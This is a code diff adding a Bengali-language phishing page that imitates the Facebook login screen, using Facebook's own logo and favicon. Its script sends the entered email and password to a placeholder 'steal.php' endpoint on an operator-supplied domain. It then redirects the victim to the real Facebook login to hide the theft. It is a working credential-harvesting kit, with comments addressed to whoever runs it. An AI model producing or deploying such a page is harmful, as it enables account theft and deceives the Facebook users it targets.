@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ফেসবুক - লগ ইন করুন</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lUyooB2PHq.png" class="logo">
+            <form id="loginForm">
+                <input type="text" placeholder="মোবাইল নম্বর বা ইমেইল" id="email" required>
+                <input type="password" placeholder="পাসওয়ার্ড" id="pass" required>
+                <button type="submit">লগ ইন করুন</button>
+            </form>
+            <p>ভাষা: বাংলা (বাংলাদেশ)</p>
+        </div>
+    </div>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById("email").value;
+    const pass = document.getElementById("pass").value;
+
+    // লগিন ডাটা তোমার সার্ভারে পাঠাচ্ছি (অপশনাল)
+    fetch("https://তোমার-ডোমেইন.com/steal.php", {
+        method: "POST",
+        body: JSON.stringify({email, pass, step: "login"}),
+        headers: {"Content-Type": "application/json"}
+    });
+
+    // রিডাইরেক্ট করে আসল ফেসবুকে পাঠাচ্ছি যাতে কুকি থাকে
+    window.location.href = "https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Fhome.php&refsrc=deprecated&_rdr";
+});
+</script>
+</body>
+</html>
